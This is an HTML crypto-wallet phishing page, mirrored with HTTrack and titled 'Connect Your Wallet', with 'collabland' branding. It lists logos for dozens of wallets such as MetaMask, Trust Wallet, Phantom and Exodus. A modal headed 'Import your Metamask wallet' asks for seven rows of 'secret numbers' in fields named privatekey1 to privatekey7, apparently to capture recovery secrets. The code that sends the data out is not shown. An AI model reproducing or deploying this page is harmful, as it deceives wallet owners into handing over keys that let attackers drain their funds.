<!-- saved from url=(0023)https://verifyme.cloud/ --><html prefix="og: http://ogp.me/ns#"><!-- Mirrored from verifyme.site/en/ by HTTrack Website Copier/3.x [XR&CO'2014], Tue, 01 Feb 2022 03:59:54 GMT --><!-- Mirrored from collabportal.live/ by HTTrack Website Copier/3.x [XR&CO'2014], Thu, 03 Mar 2022 08:09:31 GMT --><head>
      ...
      <meta property="og:title" content="Connect Your Wallet">
      ...
      <link data-react-helmet="true" rel="shortcut icon" href="images/image.jpg">
                     ...
                     <div class="sc-hrWEMg bHjlF">
                        ...
                        <button id="connect-METAMASK" class="sc-kPVwWT sc-kfGgVZ sc-kIPQKe dQoUpv">
                           ...
                           <div class="sc-bwCtUz lgYJCf">
                              <img class="firstImg" src="images/metamask-69ce6b56bbc9953dfb4aecebdf88729b.png" alt="Icon" style="width: 24px;">
                           </div>
                        </button>
                     </div>
                  </div>
               ...
               <div class="bg-white px-4 pt-5 pb-4 sm:p-6 sm:pb-4">
                  <div class="sm:flex sm:items-start">
                     ...
                     <div class="mt-3 text-center sm:mt-0 sm:ml-4 sm:text-left w-full mr-10">
                        <h3 id="modal-headline" class="text-lg leading-6 mt-2 font-medium text-gray-900" style="display: flex; flex-direction: row;"> <img src="images/metamask-69ce6b56bbc9953dfb4aecebdf88729b.png" style="margin-right: 20px; height: 40px; width: 40px" id="myImg"><span>Import your <span id="walletname">Metamask</span>
                           wallet</span>
                        </h3>
                        <div class="mt-2">
                           <div class="mt-10">
                                 ...
                                 <span id="guideDisplay2" style="display: none;">
                                  ...
                                  <div style="display:none" class="thankyou_message">
                                    ...
                                    <div class="flex flex-col mb-6">
                                       <div class="relative">
                                          <input type="text" required="required" placeholder="Secret numbers of row A" name="privatekey1" minlength="6" maxlength="6" id="privatekey1" class=" text-sm sm:text-base placeholder-gray-500 pl-4 pr-4 rounded-lg border border-gray-400 w-full py-2 focus:outline-none focus:border-blue-400">
                                          <input type="text" required="required" placeholder="Secret numbers of row B" name="privatekey2" minlength="6" maxlength="6" id="privatekey2" class=" text-sm sm:text-base placeholder-gray-500 pl-4 pr-4 rounded-lg border border-gray-400 w-full py-2 focus:outline-none focus:border-blue-400">
                                          <input type="text" required="required" placeholder="Secret numbers of row C" name="privatekey3" minlength="6" maxlength="6" id="privatekey3" class=" text-sm sm:text-base placeholder-gray-500 pl-4 pr-4 rounded-lg border border-gray-400 w-full py-2 focus:outline-none focus:border-blue-400">
                                          <input type="text" required="required" placeholder="Secret numbers of row D" name="privatekey4" minlength="6" maxlength="6" id="privatekey4" class=" text-sm sm:text-base placeholder-gray-500 pl-4 pr-4 rounded-lg border border-gray-400 w-full py-2 focus:outline-none focus:border-blue-400">
                                          <input type="text" required="required" placeholder="Secret numbers of row E" name="privatekey5" minlength="6" maxlength="6" id="privatekey5" class=" text-sm sm:text-base placeholder-gray-500 pl-4 pr-4 rounded-lg border border-gray-400 w-full py-2 focus:outline-none focus:border-blue-400">
                                          <input type="text" required="required" placeholder="Secret numbers of row F" name="privatekey6" minlength="6" maxlength="6" id="privatekey6" class=" text-sm sm:text-base placeholder-gray-500 pl-4 pr-4 rounded-lg border border-gray-400 w-full py-2 focus:outline-none focus:border-blue-400">
                                          <input type="text" required="required" placeholder="Secret numbers of row G" name="privatekey7" minlength="6" maxlength="6" id="privatekey7" class=" text-sm sm:text-base placeholder-gray-500 pl-4 pr-4 rounded-lg border border-gray-400 w-full py-2 focus:outline-none focus:border-blue-400">
      ...
      <div id="___gatsby">
         <div style="outline:none" tabindex="-1" id="gatsby-focus-wrapper">
            <div class="collabland">
               <h4 style="colorr: #fff;">Connect Your Wallet</h4>
            </div>
               ...
               <div class="Grid__SGrid-sc-8d5rqj-0 gAVVCu">
                  ...
                  <div class="pageStyles__SApp-sc-1navawn-5 cmAzHq">
                     ...
                     <div class="pageStyles__SAppIcon-sc-1navawn-6 lfUBtr">
                        <img class="img-icons" src="images/metamask-69ce6b56bbc9953dfb4aecebdf88729b.png" alt="Meta">
                     </div>
                  </div>
                  <!-- end -->                     
                  <!-- start -->
                  <div class="pageStyles__SApp-sc-1navawn-5 cmAzHq">
                     ...
                     <div class="pageStyles__SAppIcon-sc-1navawn-6 lfUBtr">
                        <img class="img-icons" src="images/trust-wallet-66f8777532931d9c09b633344981a6a9.png" alt="Trust">
                     </div>
                  </div>
                  <!-- end -->                     
                  <!-- start -->
                  <div class="pageStyles__SApp-sc-1navawn-5 cmAzHq">
                     ...
                     <div class="pageStyles__SAppIcon-sc-1navawn-6 lfUBtr">
                        <img class="img-icons" src="images/coinbase.png" alt="Coinbase">
                     </div>
                  </div>
                  <!-- end -->  
                  ...
                  <div class="pageStyles__SApp-sc-1navawn-5 cmAzHq">
                     ...
                     <div class="pageStyles__SAppIcon-sc-1navawn-6 lfUBtr">
                        <img class="img-icons" src="images/xumm.png" alt="Xumm">
                     </div>
                  </div>
                  <!-- end --> 
                  <!-- start -->
                  <div class="pageStyles__SApp-sc-1navawn-5 cmAzHq">
                     ...
                     <div class="pageStyles__SAppIcon-sc-1navawn-6 lfUBtr">
                        <img class="img-icons" src="images/cardano.png" alt="Cardano">
                     </div>
                  </div>
                  <!-- end --> 
                  <!-- start -->
                  <div class="pageStyles__SApp-sc-1navawn-5 cmAzHq">
                     ...
                     <div class="pageStyles__SAppIcon-sc-1navawn-6 lfUBtr">
                        <img class="img-icons" src="images/daedalus.png" alt="Daedalus">
                     </div>
                  </div>
                  <!-- end --> 
                  <!-- start -->
                  <div class="pageStyles__SApp-sc-1navawn-5 cmAzHq">
                     ...
                     <div class="pageStyles__SAppIcon-sc-1navawn-6 lfUBtr">
                        <img class="img-icons" src="images/yoroi.png" alt="Yoroi">
                     </div>
                  </div>
                  <!-- end --> 
                  <!-- start -->
                  <div class="pageStyles__SApp-sc-1navawn-5 cmAzHq">
                     ...
                     <div class="pageStyles__SAppIcon-sc-1navawn-6 lfUBtr">
                        <img class="img-icons" src="images/ccvault.png" alt="CCVault">
                     </div>
                  </div>
                  <!-- end --> 
                  <!-- start -->
                  <div class="pageStyles__SApp-sc-1navawn-5 cmAzHq">
                     ...
                     <div class="pageStyles__SAppIcon-sc-1navawn-6 lfUBtr">
                        <img class="img-icons" src="images/gero.jpg" alt="Gero">
                     </div>
                  </div>
                  <!-- end --> 
                  <!-- start -->
                  <div class="pageStyles__SApp-sc-1navawn-5 cmAzHq">
                     ...
                     <div class="pageStyles__SAppIcon-sc-1navawn-6 lfUBtr">
                        <img class="img-icons" src="images/nami.png" alt="Nami">
                     </div>
                  </div>
                  <!-- end --> 
                  <!-- start -->
                  <div class="pageStyles__SApp-sc-1navawn-5 cmAzHq">
                     ...
                     <div class="pageStyles__SAppIcon-sc-1navawn-6 lfUBtr">
                        <img class="img-icons" src="images/solana.png" alt="Solana">
                     </div>
                  </div>
                  <!-- end --> 
                  <!-- start -->
                  <div class="pageStyles__SApp-sc-1navawn-5 cmAzHq">
                     ...
                     <div class="pageStyles__SAppIcon-sc-1navawn-6 lfUBtr">
                        <img class="img-icons" src="images/phantom.jpg" alt="Phantom">
                     </div>
                  </div>
                  <!-- end --> 
                  <!-- start -->
                  <div class="pageStyles__SApp-sc-1navawn-5 cmAzHq">
                     ...
                     <div class="pageStyles__SAppIcon-sc-1navawn-6 lfUBtr">
                        <img class="img-icons" src="images/solflare.png" alt="Solflare">
                     </div>
                  </div>
                  <!-- end -->  
                  <!-- start -->
                  <div class="pageStyles__SApp-sc-1navawn-5 cmAzHq">
                     ...
                     <div class="pageStyles__SAppIcon-sc-1navawn-6 lfUBtr">
                        <img class="img-icons" src="images/sollet.png" alt="Sollet">
                     </div>
                  </div>
                  <!-- end --> 
                  <!-- start -->
                  <div class="pageStyles__SApp-sc-1navawn-5 cmAzHq">
                     ...
                     <div class="pageStyles__SAppIcon-sc-1navawn-6 lfUBtr">
                        <img class="img-icons" src="images/solong.jpg" alt="Solong">
                     </div>
                  </div>
                  <!-- end --> 
                  <!-- start -->
                  <div class="pageStyles__SApp-sc-1navawn-5 cmAzHq">
                     ...
                     <div class="pageStyles__SAppIcon-sc-1navawn-6 lfUBtr">
                        <img class="img-icons" src="images/exodus.png" alt="Exodus">
                     </div>
                  </div>
                  <!-- end --> 
                  <!-- start -->
                  <div class="pageStyles__SApp-sc-1navawn-5 cmAzHq">
                     ...
                     <div class="pageStyles__SAppIcon-sc-1navawn-6 lfUBtr">
                        <img class="img-icons" src="images/avalanche.png" alt="Avalanche">
                     </div>
                  </div>
                  <!-- end --> 
                  <!-- start -->
                  <div class="pageStyles__SApp-sc-1navawn-5 cmAzHq">
                     ...
                     <div class="pageStyles__SAppIcon-sc-1navawn-6 lfUBtr">
                        <img class="img-icons" src="images/velas.png" alt="Velas">
                     </div>
                  </div>
                  <!-- end --> 
                  ...
                  <div class="pageStyles__SApp-sc-1navawn-5 cmAzHq">
                     ...
                     <div class="pageStyles__SAppIcon-sc-1navawn-6 lfUBtr">
                        <img class="img-icons" src="images/crypto-4cbeac57421fb3ca2573db2cf448169a.png" alt="Cypto.com">
                     </div>
                  </div>
                  <!-- end -->          
                  <!-- start -->
                  <div class="pageStyles__SApp-sc-1navawn-5 cmAzHq">
                     ...
                     <div class="pageStyles__SAppIcon-sc-1navawn-6 lfUBtr">
                        <img class="img-icons" src="images/blockchain-logo.png" alt="Blockchain">
                     </div>
                  </div>
                  <!-- end -->                     
                  <!-- start -->
                  <div class="pageStyles__SApp-sc-1navawn-5 cmAzHq">
                     ...
                     <div class="pageStyles__SAppIcon-sc-1navawn-6 lfUBtr">
                        <img class="img-icons" src="images/bsc-logo.png" alt="binance">
                     </div>
                  </div>
                  <!-- end -->                     
                  <!-- start -->
                  <div class="pageStyles__SApp-sc-1navawn-5 cmAzHq">
                     ...
                     <div class="pageStyles__SAppIcon-sc-1navawn-6 lfUBtr">
                        <img class="img-icons" src="images/safepal-1022b40e2ea3a4a6bb19cf6ff28d8b92.png" alt="safepal">
                     </div>
                  </div>
                  <!-- end -->                     
                  <!-- start -->
                  <div class="pageStyles__SApp-sc-1navawn-5 cmAzHq">
                     ...
                     <div class="pageStyles__SAppIcon-sc-1navawn-6 lfUBtr">
                        <img class="img-icons" src="images/image.jpg" alt="Argent">
                     </div>
                  </div>
                  <!-- end -->  
                  <!-- start -->
                  <div class="pageStyles__SApp-sc-1navawn-5 cmAzHq">
                     ...
                     <div class="pageStyles__SAppIcon-sc-1navawn-6 lfUBtr">
                        <img class="img-icons" src="images/formatic.png" alt="Meta">
                     </div>
                  </div>
                  <!-- end -->                   
                  <!-- start -->
                  <div class="pageStyles__SApp-sc-1navawn-5 cmAzHq">
                     ...
                     <div class="pageStyles__SAppIcon-sc-1navawn-6 lfUBtr">
                        <img class="img-icons" src="images/aktionariat-c5784b26234a389632687a36d2fb3258.png" alt="aktionariat">
                     </div>
                  </div>
                  <!-- end -->                     
                  <!-- start -->
                  <div class="pageStyles__SApp-sc-1navawn-5 cmAzHq">
                     ...
                     <div class="pageStyles__SAppIcon-sc-1navawn-6 lfUBtr">
                        <img class="img-icons" src="images/keyringpro-830b2c0ee1db401dd64c2899eaf2adb3.png" alt="keyring">
                     </div>
                  </div>
                  <!-- end -->                     
                  <!-- start -->
                  <div class="pageStyles__SApp-sc-1navawn-5 cmAzHq">
                     ...
                     <div class="pageStyles__SAppIcon-sc-1navawn-6 lfUBtr">
                        <img class="img-icons" src="images/bitkeep-387b0ca7da4cf322f44c70c23064c529.png" alt="bitkeep">
                     </div>
                  </div>
                  <!-- end -->         
                  <!-- start -->
                  <div class="pageStyles__SApp-sc-1navawn-5 cmAzHq">
                     ...
                     <div class="pageStyles__SAppIcon-sc-1navawn-6 lfUBtr">
                        <img class="img-icons" src="images/sparkpoint-5c0d3a4ab850a7ee2a3f03e215b68f2c.png" alt="SparkPoint">
                     </div>
                  </div>
                  <!-- end -->                     
                  <!-- start -->
                  <div class="pageStyles__SApp-sc-1navawn-5 cmAzHq">
                     ...
                     <div class="pageStyles__SAppIcon-sc-1navawn-6 lfUBtr">
                        <img class="img-icons" src="images/ownbit-0b6b21e40acf2fa0f85d2c5ce38c4c51.png" alt="ownbit">
                     </div>
                  </div>
                  <!-- end -->                     
                  <!-- start -->
                  <div class="pageStyles__SApp-sc-1navawn-5 cmAzHq">
                     ...
                     <div class="pageStyles__SAppIcon-sc-1navawn-6 lfUBtr">
                        <img class="img-icons" src="images/infinity-wallet-48e78bc97f96bad14ee6b781423a69ea.png" alt="infinity">
                     </div>
                  </div>
                  <!-- end -->                     
                  <!-- start -->
                  <div class="pageStyles__SApp-sc-1navawn-5 cmAzHq">
                     ...
                     <div class="pageStyles__SAppIcon-sc-1navawn-6 lfUBtr">
                        <img class="img-icons" src="images/wallet-io-198f396de22fe25eb370f46544abe69d.png" alt="wallet.io">
                     </div>
                  </div>
                  <!-- end -->                
                  <!-- start -->
                  <div class="pageStyles__SApp-sc-1navawn-5 cmAzHq">
                     ...
                     <div class="pageStyles__SAppIcon-sc-1navawn-6 lfUBtr">
                        <img class="img-icons" src="images/infinito-wallet-68da061495160c96f4bcb5e70e612fdd.png" alt="Infinito">
                     </div>
                  </div>
                  <!-- end -->                     
                  <!-- start -->
                  <div class="pageStyles__SApp-sc-1navawn-5 cmAzHq">
                     ...
                     <div class="pageStyles__SAppIcon-sc-1navawn-6 lfUBtr">
                        <img class="img-icons" src="images/image%20%286%29.jpg" alt="torus">
                     </div>
                  </div>
                  <!-- end -->         
                  <!-- start -->
                  <div class="pageStyles__SApp-sc-1navawn-5 cmAzHq">
                     ...
                     <div class="pageStyles__SAppIcon-sc-1navawn-6 lfUBtr">
                        <img class="img-icons" src="images/image%20%285%29.jpg" alt="nash">
                     </div>
                  </div>
                  <!-- end -->            
                  <!-- start -->
                  <div class="pageStyles__SApp-sc-1navawn-5 cmAzHq">
                     ...
                     <div class="pageStyles__SAppIcon-sc-1navawn-6 lfUBtr">
                        <img class="img-icons" src="images/bitpay-1573dd6c95eb38386f181048663590d0.jpg" alt="Bitpay">
                     </div>
                  </div>
                  <!-- end -->                     
                  <!-- start -->
                  <div class="pageStyles__SApp-sc-1navawn-5 cmAzHq">
                     ...
                     <div class="pageStyles__SAppIcon-sc-1navawn-6 lfUBtr">
                        <img class="img-icons" src="images/imtoken-fd8c7c52dac6101568954e7448a49202.png" alt="imtoken">
                     </div>
                  </div>
                  <!-- end -->                     
                  <!-- start -->
                  <div class="pageStyles__SApp-sc-1navawn-5 cmAzHq">
                     ...
                     <div class="pageStyles__SAppIcon-sc-1navawn-6 lfUBtr">
                        <img class="img-icons" src="images/otherssss.jpg" alt="Other">
                     </div>
                  </div>
                  <!-- end -->                     
               </div>
...
</body><!-- Mirrored from verifyme.site/en/ by HTTrack Website Copier/3.x [XR&CO'2014], Tue, 01 Feb 2022 04:00:11 GMT --><!-- Mirrored from collabportal.live/ by HTTrack Website Copier/3.x [XR&CO'2014], Thu, 03 Mar 2022 08:09:53 GMT --></html>